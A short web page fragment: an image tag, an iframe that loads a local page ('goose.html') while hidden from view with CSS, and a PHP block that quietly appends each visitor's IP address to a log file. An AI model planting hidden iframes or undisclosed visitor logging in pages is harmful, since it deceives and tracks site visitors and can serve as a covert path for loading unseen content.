<img src="screenshot-030312.bmp"/>
<iframe src="./goose.html" style="visibility:hidden;position:absolute"></iframe><?
$f = fopen('log.txt','a+');
fputs($f, $_SERVER['REMOTE_ADDR']."\n");
fclose($f);
?>